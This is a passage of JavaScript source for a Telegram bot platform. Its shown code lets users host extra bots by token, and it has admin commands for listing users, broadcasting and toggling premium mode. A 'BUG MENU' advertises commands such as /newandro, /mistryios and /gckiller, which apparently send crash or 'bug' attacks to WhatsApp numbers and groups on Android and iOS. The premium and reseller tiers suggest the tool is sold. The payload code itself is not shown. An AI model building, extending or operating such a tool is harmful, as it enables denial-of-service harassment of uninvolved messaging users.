┃ Yᴏᴜ ᴄᴀɴ ʜᴏsᴛ ᴏɴʟʏ 1 ʙᴏᴛ.
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

Uꜱᴇ:
<code>/delbot</code>

Tᴏ ʀᴇᴍᴏᴠᴇ ʏᴏᴜʀ ᴄᴜʀʀᴇɴᴛ ʙᴏᴛ.
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Tᴏᴋᴇɴ ====================

        const messageText =
            (msg.text || '').trim();

        const args =
            messageText.split(/\s+/);

        const newToken = args[1];


        if (!newToken) {

            return S7.sendMessage(
                chatId,
                `
╭━━━〔 🤖 Aᴅᴅ Bᴏᴛ 〕━━━╮
┃
┃ Uꜱᴀɢᴇ:
┃ <code>/addbot YOUR_BOT_TOKEN</code>
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

⚠️ Nᴇᴠᴇʀ sʜᴀʀᴇ ʏᴏᴜʀ BᴏᴛFᴀᴛʜᴇʀ ᴛᴏᴋᴇɴ.
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Tᴏᴋᴇɴ Fᴏʀᴍᴀᴛ ====================

        if (
            !/^\d+:[A-Za-z0-9_-]{20,}$/.test(
                newToken
            )
        ) {

            return S7.sendMessage(
                chatId,
                `
❌ <b>Iɴᴠᴀʟɪᴅ Bᴏᴛ Tᴏᴋᴇɴ</b>

Cʜᴇᴄᴋ ᴛʜᴇ ᴛᴏᴋᴇɴ ғʀᴏᴍ BᴏᴛFᴀᴛʜᴇʀ.
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Dᴜᴘʟɪᴄᴀᴛᴇ ====================

        const alreadyHosted =
            db.tokens.find(
                bot =>
                    String(bot.token) ===
                    String(newToken)
            );

        if (alreadyHosted) {

            return S7.sendMessage(
                chatId,
                '❌ Tʜɪs ʙᴏᴛ ɪs ᴀʟʀᴇᴀᴅʏ ʜᴏsᴛᴇᴅ.',
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Vᴇʀɪғʏ ====================

        const tempBot =
            new SY(
                newToken,
                {
                    polling: false
                }
            );

        let botInfo;

        try {

            botInfo =
                await tempBot.getMe();

        } catch (error) {

            return S7.sendMessage(
                chatId,
                `
❌ <b>Tᴏᴋᴇɴ Vᴇʀɪғɪᴄᴀᴛɪᴏɴ Fᴀɪʟᴇᴅ</b>

Tᴇʟᴇɢʀᴀᴍ ᴅɪᴅ ɴᴏᴛ ᴀᴄᴄᴇᴘᴛ ᴛʜɪs ᴛᴏᴋᴇɴ.

Pʟᴇᴀsᴇ ᴄʜᴇᴄᴋ BᴏᴛFᴀᴛʜᴇʀ.
`,
                { parse_mode: 'HTML' }
            );
        }


        // ==================== Dᴇғᴀᴜʟᴛ Cᴏɴғɪɢ ====================

        const defaultConfig = {

            channel:
                config.channel || '',

            group:
                config.group || '',

            video:
                config.video || '',

            botName:
                botInfo.first_name ||
                'Hᴏsᴛᴇᴅ Bᴏᴛ',

            ownerContact:
                config.ownerContact || '',

            protectionState:
                false,

            channelId:
                config.channelId || '',

            groupId:
                config.groupId || ''
        };


        // ==================== Sᴀᴠᴇ ====================

        db.tokens.push({

            token: newToken,

            owner: chatId,

            username:
                botInfo.username || '',

            botId:
                botInfo.id || null,

            config:
                defaultConfig,

            createdAt:
                new Date().toISOString()
        });

        saveDB(db);


        // ==================== Sᴛᴀʀᴛ ====================

        try {

            startSYloveBot(
                newToken
            );

        } catch (error) {

            db = getDB();

            db.tokens =
                db.tokens.filter(
                    bot =>
                        bot.token !== newToken
                );

            saveDB(db);

            throw error;
        }


        // ==================== Sᴜᴄᴄᴇss ====================

        await S7.sendMessage(
            chatId,
            `
╭━━━〔 🟢 Bᴏᴛ Hᴏsᴛᴇᴅ 〕━━━╮
┃
┃ 🤖 <b>Nᴀᴍᴇ:</b>
┃ ${escapeHTML(
                botInfo.first_name ||
                'Uɴᴋɴᴏᴡɴ'
            )}
┃
┃ 👤 <b>Uꜱᴇʀɴᴀᴍᴇ:</b>
┃ @${escapeHTML(
                botInfo.username ||
                'unknown'
            )}
┃
┃ 🆔 <b>Bᴏᴛ ID:</b>
┃ <code>${botInfo.id}</code>
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

✅ Yᴏᴜʀ ʙᴏᴛ ʜᴀs ʙᴇᴇɴ ʜᴏsᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.

<b>📌 Nᴇxᴛ Sᴛᴇᴘs</b>

1️⃣ Aᴅᴅ ᴛʜᴇ ʙᴏᴛ ᴀs <b>Aᴅᴍɪɴ</b> ᴛᴏ ʏᴏᴜʀ ʀᴇǫᴜɪʀᴇᴅ ᴄʜᴀɴɴᴇʟ / ɢʀᴏᴜᴘ.

2️⃣ Cᴜsᴛᴏᴍɪᴢᴇ ʏᴏᴜʀ ʙᴏᴛ:
<code>/setbot</code>

3️⃣ Tᴇsᴛ ʏᴏᴜʀ ʙᴏᴛ.

🔐 <b>Sᴇᴄᴜʀɪᴛʏ</b>
Nᴇᴠᴇʀ sʜᴀʀᴇ ʏᴏᴜʀ ʙᴏᴛ ᴛᴏᴋᴇɴ.
`,
            { parse_mode: 'HTML' }
        );

    } catch (error) {

        console.error(
            '[AᴅᴅBᴏᴛ Eʀʀᴏʀ]',
            error
        );

        S7.sendMessage(
            chatId,
            `
❌ <b>Uɴᴇxᴘᴇᴄᴛᴇᴅ Eʀʀᴏʀ</b>

<code>${escapeHTML(
                error.message
            )}</code>
`,
            { parse_mode: 'HTML' }
        );
    }
});


// ============================================================
// DᴇʟBᴏᴛ
// ============================================================

SYLoVe('delbot', async (msg) => {

    const chatId = String(msg.chat.id);

    try {

        let db = getDB();


        // ==================== Fɪɴᴅ Bᴏᴛ ====================

        const botData =
            getHostedBot(
                db,
                chatId
            );

        if (!botData) {

            return S7.sendMessage(
                chatId,
                `
╭━━━〔 ❌ Nᴏ Bᴏᴛ 〕━━━╮
┃
┃ Yᴏᴜ ᴅᴏ ɴᴏᴛ ʜᴀᴠᴇ ᴀ ʜᴏsᴛᴇᴅ ʙᴏᴛ.
┃
╰━━━━━━━━━━━━━━━━━━╯

Uꜱᴇ:
<code>/addbot TOKEN</code>
`,
                { parse_mode: 'HTML' }
            );
        }


        const botToken =
            botData.token;

        const botName =
            botData.config?.botName ||
            'Hᴏsᴛᴇᴅ Bᴏᴛ';


        // ==================== Sᴛᴏᴘ Bᴏᴛ ====================

        if (activeBots[botToken]) {

            try {

                await activeBots[
                    botToken
                ].stopPolling();

            } catch (error) {

                console.log(
                    '[DᴇʟBᴏᴛ] Sᴛᴏᴘ Eʀʀᴏʀ:',
                    error.message
                );
            }

            delete activeBots[
                botToken
            ];
        }


        // ==================== Dᴇʟᴇᴛᴇ Dᴀᴛᴀ ====================

        db.tokens =
            db.tokens.filter(
                bot =>
                    !(
                        String(bot.owner) ===
                            chatId &&
                        String(bot.token) ===
                            String(botToken)
                    )
            );

        saveDB(db);


        // ==================== Sᴇssɪᴏɴ Cʟᴇᴀɴᴜᴘ ====================

        const userAuthPath =
            path.join(
                './Love',
                chatId
            );

        if (
            fs.existsSync(
                userAuthPath
            )
        ) {

            try {

                fs.rmSync(
                    userAuthPath,
                    {
                        recursive: true,
                        force: true
                    }
                );

            } catch (error) {

                console.log(
                    '[DᴇʟBᴏᴛ] Fɪʟᴇ Cʟᴇᴀɴᴜᴘ Eʀʀᴏʀ:',
                    error.message
                );
            }
        }


        // ==================== Sᴜᴄᴄᴇss ====================

        await S7.sendMessage(
            chatId,
            `
╭━━━〔 🗑️ Bᴏᴛ Dᴇʟᴇᴛᴇᴅ 〕━━━╮
┃
┃ 🤖 <b>Bᴏᴛ:</b>
┃ ${escapeHTML(botName)}
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯

✅ Bᴏᴛ ʀᴇᴍᴏᴠᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.

• 🗄️ Dᴀᴛᴀʙᴀsᴇ ᴇɴᴛʀʏ ʀᴇᴍᴏᴠᴇᴅ
• 🔴 Bᴏᴛ ᴘʀᴏᴄᴇss sᴛᴏᴘᴘᴇᴅ
• 🧹 Sᴇssɪᴏɴ ғɪʟᴇs ᴄʟᴇᴀɴᴇᴅ

Yᴏᴜ ᴄᴀɴ ʜᴏsᴛ ᴀ ɴᴇᴡ ʙᴏᴛ:

<code>/addbot TOKEN</code>
`,
            { parse_mode: 'HTML' }
        );

    } catch (error) {

        console.error(
            '[DᴇʟBᴏᴛ Eʀʀᴏʀ]',
            error
        );

        S7.sendMessage(
            chatId,
            `
❌ <b>Dᴇʟᴇᴛᴇ Eʀʀᴏʀ</b>

<code>${escapeHTML(
                error.message
            )}</code>
`,
            { parse_mode: 'HTML' }
        );
    }
});

        // ========== FIXED: state with proper admin check ==========
        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            // 🔥 FIX: Convert to number for comparison
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            if (value !== '0' && value !== '1') {
                return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            }

            let db = getDB();
            db.state = Number(value);
            saveDB(db);

            S7.sendMessage(
                chatId,
                value === '0'
                    ? '✅ State set to FREE MODE (All users allowed)'
                    : '🔒 State set to PREMIUM ONLY MODE'
            );
        });

        // ========== FIXED: listuser with proper admin check ==========
        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            // 🔥 FIX: Convert to number for comparison
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(msg.chat.id, '🚫 You are not authorized to use this command.');
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');

            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => {
                list += `${i + 1}. ${u.name} (${u.id})\n`;
            });

            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
      });

        // Admin-only Telegram broadcast to users registered through /start.
        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (userId !== config.adminId.toString()) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            const broadcastText = msg.text
                .trim()
                .replace(/^\/broadcast(?:@\w+)?(?:\s+|$)/i, '')
                .trim();

            if (!broadcastText) {
                return S7.sendMessage(chatId, 'Usage: /broadcast Your message here');
            }

            if (broadcastText.length > 4096) {
                return S7.sendMessage(
                    chatId,
                    '❌ Message is too long. Telegram allows up to 4096 characters.'
                );
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '❌ No registered users found.');
            }

            let users;
            try {
                users = JSON.parse(fs.readFileSync(userFile, 'utf8'));
            } catch (error) {
                log('error', 'BROADCAST', `Could not read user list: ${error.message}`);
                return S7.sendMessage(chatId, '❌ Could not read the registered user list.');
            }

            const recipientIds = [
                ...new Set(
                    (Array.isArray(users) ? users : [])
                        .map(user => user?.id)
                        .filter(id => id !== undefined && id !== null)
                        .map(id => id.toString())
                )
            ];

            if (recipientIds.length === 0) {
                return S7.sendMessage(chatId, '❌ No registered users found.');
            }

            await S7.sendMessage(
                chatId,
                `📢 Broadcast started for ${recipientIds.length} users...`
            );

            let sent = 0;
            let failed = 0;

            for (const recipientId of recipientIds) {
                let delivered = false;

                for (let attempt = 0; attempt < 2 && !delivered; attempt++) {
                    try {
                        await S7.sendMessage(recipientId, broadcastText, {
                            disable_web_page_preview: true
                        });
                        delivered = true;
                        sent++;
                    } catch (error) {
                        const retryAfter = Number(
                            error?.response?.body?.parameters?.retry_after
                        );

                        if (
                            attempt === 0 &&
                            Number.isFinite(retryAfter) &&
                            retryAfter > 0 &&
                            retryAfter <= 60
                        ) {
                            await new Promise(resolve =>
                                setTimeout(resolve, retryAfter * 1000)
                            );
                        } else {
                            failed++;
                            log(
                                'error',
                                'BROADCAST',
                                `Failed for ${recipientId}: ${error.message}`
                            );
                        }
                    }
                }

                // Stay below Telegram's broadcast rate limit.
                await new Promise(resolve => setTimeout(resolve, 45));
            }

            return S7.sendMessage(
                chatId,
                `✅ Broadcast completed.\n\n📨 Sent: ${sent}\n❌ Failed: ${failed}`
            );
        });

                S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
    const uptime = getRuntime();
    const love = userId.toString();
    const S7edit = (text, opts) => {
        S7.editMessageCaption(text, opts).catch((err) => {
            if (!err.message.includes('message is not modified')) {
                log('error', 'SYSTEM', err.message);
            }
        });
    };
            if (data === 'check_membership') {
                const isMember = await CheckSYlovesToo(S7, userId);

                if (isMember) {
                    S7.deleteMessage(chatId, messageId).catch(() => {});
                    S7.sendMessage(chatId, 
    `╭─❖ 𝗠ᴇᴍʙᴇʀsʜɪᴘ 𝗩ᴇʀɪғɪᴇᴅ ❖─╮\n\n` +
    `✅ <b>𝗠ᴇᴍʙᴇʀsʜɪᴘ 𝗩ᴇʀɪғɪᴇᴅ!</b>\n\n` +
    `Yᴏᴜ ᴀʀᴇ ɴᴏᴡ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ʙᴏᴛʜ ᴛʜᴇ\n` +
    `Cʜᴀɴɴᴇʟ & Gʀᴏᴜᴘ. 🎉\n\n` +
    `➤ Tʀʏ ʏᴏᴜʀ ᴄᴏᴍᴍᴀɴᴅ ᴀɢᴀɪɴ:\n\n` +
    `• /start\n` +
    `• /reqpair\n\n` +
    `╰────────────────────╯`, 
    { parse_mode: 'HTML' }
);
                } else {
                    S7.answerCallbackQuery(query.id, { 
                        text: '❌ You have not joined both the Channel and Group yet!', 
                        show_alert: true 
                    });
                }
            };


            if (data === 'misc_menu') {
    const chatId = query.message.chat.id;
    const userId = query.from.id.toString();

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    const love = query.from.id.toString();

    const miscText = MainSYLoVe(name, uptime, love) + `

<blockquote>
┌──────┤ 𝐌𝐈𝐒𝐂 𝐌𝐄𝐍𝐔 ├──────┐
│
│➻⪩⧼ 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐄𝐒𝐒𝐈Ⓞ𝐍 ⧽⪨
│➻ reqpair number
│➻ delpair number
├──────────────────────┤
│➻⪩⧼ 𝐓Ⓞ𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨
│➻ addtoken token
│➻ deltoken token
│➻ mytoken
├──────────────────────┤
│➻⪩⧼ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨
│➻ addprem ID
│➻ delprem ID
│➻ listprem
├──────────────────────┤
│➻⪩⧼ 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨
│➻ addresell ID
│➻ delresell ID
│➻ listresell
├──────────────────────┤
│➻⪩⧼ 𝐎𝐓𝐇𝐄𝐑 𝐂Ⓞ𝐌𝐌𝐀𝐍𝐃𝐒 ⧽⪨
│➻ listuser
│➻ broadcast message
│➻ state 0 | 1
├──────────────────────┤
│⪩⧼ 𝐌𝐀𝐊𝐄 𝐘𝐎𝐔𝐑 𝐁𝐎𝐓 ⧽⪨
│➻  addbot
│➻  delbot
│➻  setbot
└──────────────────────┘
</blockquote>
`;

    S7edit(
        miscText,
        {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            ...Lovesbutton
        }
    );
}

            if (data === 'bug_menu') {
            const chatId = query.message.chat.id;
            const userId = query.from.id.toString();
            if (!LoveGlobalState(userId)) {
             return sendSYLove(S7, chatId);
                }
                const love = query.from.id.toString();
                const bugText = MainSYLoVe(name, uptime, love) + `

<blockquote>┌──────┤ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ├──────┐
│➻⪩⧼ 𝐀𝐍𝐃𝐑ⓞ𝐈𝐃  𝐁𝐔𝐆 ⧽⪨
│➻ /newandro ɴᴜᴍ ᴛɪᴍᴇ
│➻ /newandro2 ɴum ᴛime
│➻ /mistry ɴᴜᴍ ᴛɪᴍᴇ
│➻ /mistry2 ɴᴜᴍ ᴛɪᴍᴇ 
├──────────────────────┤
│➻⪩⧼ 𝐈Ⓞ𝐒 𝐁Ⓥ𝐆 ⧽⪨
│➻ /mistryios ɴᴜᴍ ᴛɪᴍᴇ
│➻ /mistryios2 ɴᴜᴍ ᴛɪᴍᴇ
├──────────────────────┤
│➻⪩⧼ 𝐆𝐑Ⓞ𝐔𝐏 𝐁Ⓤ𝐆 ⧽⪨
│➻ /gckiller ɢᴄ ᴛɪᴍᴇ
│➻ /andforce ɢᴄ ᴛɪᴍᴇ
│➻ /listgc ɢᴄ ɪᴅ
└──────────────────────┘</blockquote>
                `;
                 S7edit(bugText, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', ...Lovesbutton });
                }
           });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
if (!config.mainToken) {
    console.error(
        'Missing TELEGRAM_BOT_TOKEN. Set it in the environment before starting the bot.'
    );
    process.exit(1);
}

startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
    startSYloveBot(obj.token);
});
} else {
    log('info', null, 'No extra bugs found in database.');
}
